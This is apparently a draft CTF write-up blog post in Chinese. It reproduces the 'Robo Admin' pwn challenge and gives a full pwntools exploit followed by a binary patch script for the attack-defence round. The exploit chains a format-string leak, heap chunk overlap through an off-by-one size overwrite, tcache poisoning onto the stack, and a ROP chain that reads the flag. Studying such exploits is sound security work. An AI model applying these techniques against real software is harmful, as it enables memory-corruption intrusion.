---
title: 软件系统安全赛2026半决赛 Robo Admin 复现
published: 2026-05-03
description: 教练，我也想开热点
tags: [unsorted bin切割, 堆块重叠, awdp fix]
category: Pwn
draft: true
---

## Robo Admin 复现

均参考自[ItsFlicker](https://blog.mcitd.cn/)



### attack
```python
#!/usr/bin/env python3

from pwn import *
import sys
from SomeofHouse import HouseOfSome

import os

# 获取当前脚本所在目录的绝对路径
base_dir = os.path.dirname(os.path.abspath(__file__))
# 将工作目录切换到脚本所在目录
os.chdir(base_dir)
print("当前工作目录:", os.getcwd())

exe = ELF("./robo_admin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context(arch="amd64", os="linux")
context.log_level = "debug"
# context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary

gs = """
b main
c
"""

choice = 0x0
if choice:
    port = 123
    target = ""
    p = remote(target, port)
else:
    p = process([exe.path])
    # p = gdb.debug(context.binary.path, gdbscript=gs)


io = p


def debug(cmd=""):
    if choice == 1:
        return
    gdb.attach(p, gdbscript=cmd)


def get_sb():
    return libc_base + libc.sym["system"], libc_base + next(libc.search(b"/bin/sh\x00"))


def str_to_hex(Str):
    return "0x" + bytearray(reversed(Str.encode())).hex()


def to_hex_escape(b: bytes) -> bytes:
    """
    把任意 bytes 转成全是 \\xHH 形式的“16进制转义 bytes”。
    例：b'D\\x89' -> b'\\x44\\x89'
    """
    return b"".join((r"\x%02x" % byte).encode("ascii") for byte in b)


import subprocess


def get_one_gadget_addrs(libc: ELF, libc_base: int) -> list:
    """
    通过解析本地 one_gadget 命令的输出，结合 libc_base 计算绝对地址。

    参数:
        libc: pwntools 解析的 libc ELF 对象 (例如: ELF('/path/libc.so.6'))
        libc_base: 泄露出来的 libc 在内存中的基址 (int)

    返回:
        一个包含该 libc 所有 one_gadget 绝对地址的整型列表
    """
    try:
        # libc.path 获取 ELF 文件的绝对路径
        # '-r' 或 '--raw' 选项让 one_gadget 仅输出纯数字格式的偏移，以空格分隔
        cmd = ["one_gadget", "-r", libc.path]

        # 调用子进程执行，屏蔽掉可能输出到 stderr 的多余警告
        raw_output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(
            "utf-8"
        )

        # 将文本分割并转换为整型 offset
        offsets = [int(x, 0) for x in raw_output.strip().split()]

        # 加上泄露出的基址，计算实际内存地址
        actual_addrs = [libc_base + offset for offset in offsets]

        print("成功解析并计算出 " + str(len(actual_addrs)) + " 个 one_gadget 地址: ")
        print([hex(i) for i in actual_addrs])
        return actual_addrs

    except FileNotFoundError:
        log.error(
            "系统未安装 one_gadget 或不在环境变量 PATH 中。请运行 'gem install one_gadget' 安装。"
        )
        return 1
    except subprocess.CalledProcessError:
        log.error("执行 one_gadget 失败，请检查传入的 libc 路径是否正确。")
        return 2


libc_base = b"fake_libc_base"

s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
sa = lambda x, data: p.sendafter(x, data)
sla = lambda x, data: p.sendlineafter(x, data)
r = lambda num=4096: p.recv(num)
rl = lambda num=4096: p.recvline(num)
ru = lambda x: p.recvuntil(x)
itr = lambda: p.interactive()
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
uru64 = lambda: uu64(ru(b"\x7f")[-6:])
libc_os = lambda x: libc_base + x
# 定义颜色常量（无大括号）
GREEN = "\033[92m"
RESET = "\033[0m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
leak = lambda name: print("%s[+] %s = %s%s" % (YELLOW, name, hex(eval(name)), RESET))
n2b = lambda x: str(x).encode()


def menu(choice):
    sla(b"> \n", n2b(choice))


def admin_login(token, password):
    menu(3)
    sla(b"Token:\n", token)
    sla(b"Password (32 hex):\n", password)


def set_notice(data):
    menu(1)
    pause()
    s(data)


def show_status():
    menu(2)


gs = """
brva 0x2486
brva 0x2481
brva 0x1920
brva 0x188C
brva 0x1521
brva 0x1563
brva 0x1A4A
"""


def to_hex(data):
    a = ""
    for i in data:
        a += "\\"
        a += "x"
        a += hex(ord(i))[2:]
    return a


gs = """
brva 0x1925
brva 0x1891
"""
debug(gs)
# admin_login(b'ROBOADMIN', b'123456')
set_notice(to_hex("%6$p%7$p%23$p%15$p%14$p"))
show_status()
ru(b"Notice: ")
password1 = int(r(18), 16)
password2 = int(r(18), 16)
libc_base = int(r(14), 16) - 0x29D90
pie_base = int(r(14), 16) - 0x2893
stack = int(r(14), 16)

leak("password1")
leak("password2")
leak("libc_base")
leak("pie_base")
leak("stack")
password = hex(password1)[2:] + hex(password2)[2:]
admin_login(b"ROBOADMIN", password.encode())


def add(idx, size):
    menu(1)
    sla(b"Index:\n", n2b(idx))
    sla(b"Task name:\n", b"task" + n2b(idx))
    sla(b"Desc size:\n", n2b(size))


def edit(idx, data):
    menu(2)
    sla(b"Index:\n", n2b(idx))
    sla(b"Write length :\n", n2b(size(data)))
    sa(b"New desc bytes:\n", data)


def show(idx):
    menu(3)
    sla(b"Index:\n", n2b(idx))


def List():
    menu(4)


def delete(idx):
    menu(5)
    sla(b"Index:\n", n2b(idx))


# leak heap_base
add(0, 0xF8)  # 0
add(1, 0xF8)  # 1
add(2, 0xF8)  # 2
add(3, 0xF8)  # 3
add(4, 0x100)  # 4
add(5, 0x200)  # 5
add(6, 0xF8)  # 6

# debug()
edit(0, b"a" * 0xF8 + p8(0x11))  # idx1 0x101 => 0x111
delete(1)
# chunk1  0x10,0xf0,0x10,0xf0
add(1, 0x108)
edit(1, b"a" * 0xF8 + p64(0x521))  # cover chunk 2, 3, 4, 5
edit(0, b"a" * 0xF8 + p8(0x01))  # restore

delete(2)  # free 0x520
add(2, 0xF8)
add(7, 0xF8)
delete(7)
gs = """
brva 0x227F
"""
# debug(gs)
# tcache: chunk1 -> 0
# chunk1: (chunk1 >> 12)
show(3)
ru(b"=> ")
heap = uu64(r(5).strip()) << 12
leak("heap")

# attack
delete(2)
edit(1, b"A" * 0xF8 + p64(0x101) + p64((heap >> 12) ^ (stack - 0x28 - 0x8)))

add(7, 0xF8)
delete(4)
gs = """
brva 0x25EF
brva 0x2635
"""
add(4, 0xF8)
# debug(gs)
show(4)

libc.address = libc_base
rop = ROP(libc)
rop.call("open", [stack - 0x30, 0])  # openat
rop.call("read", [3, stack + 0x500, 0x100])
rop.call("write", [1, stack + 0x500, 0x100])
rop_chain = b"flag".ljust(0x8, b"\x00")
rop_chain += rop.chain()

edit(4, rop_chain)
menu(6)
itr()
```
### fix
```python
# tar -cvf update.tar robo_admin_patched fix.sh
# eh_frame: 0x33E0
# strstr: 0x1200
# puts: 0x11D0
from pwn import *
from AwdPwnPatcher import *
import os

# 获取当前脚本所在目录的绝对路径
base_dir = os.path.dirname(os.path.abspath(__file__))
# 将工作目录切换到脚本所在目录
os.chdir(base_dir)

file = "./robo_admin"
context(arch="amd64")
patcher = AwdPwnPatcher(file)

illegal_addr = patcher.add_constant_in_ehframe(
    "[X] decoded input contains illegal chars\x00"
)
# 0xE8 是 CALL rel32, 0xFFFFF956作为有符号 32 位整数就是 -0x6AA
patcher.patch_origin(0x1925, machine_code=[0xE8, 0x56, 0xF9, 0xFF, 0xFF, 0x90, 0x90])

# 检查解码字符串是否包含非法字符
code = """
    mov r9, rdi
    lea rdi, [rbp-0x310]
    mov rsi, 0x25
    call 0x1200

    test rax, rax
    jnz failed

    lea rdi, [rbp-0x310]
    mov rsi, 0x24
    call 0x1200

    test rax, rax
    jnz failed

    mov rdi, r9
    lea rsi, [rbp-0x310]
    mov rdx, 0xFF
    jmp 0x1925

failed:
    lea rdi, qword ptr [{0}]
    call 0x11D0
    leave
    ret
""".format(hex(illegal_addr))


patcher.patch_by_jmp(0x1920, assembly=code)

# 确保 update 文件夹存在
if not os.path.exists("./update"):
    os.makedirs("./update")

patcher.save("./update/robo_admin_patched")
```
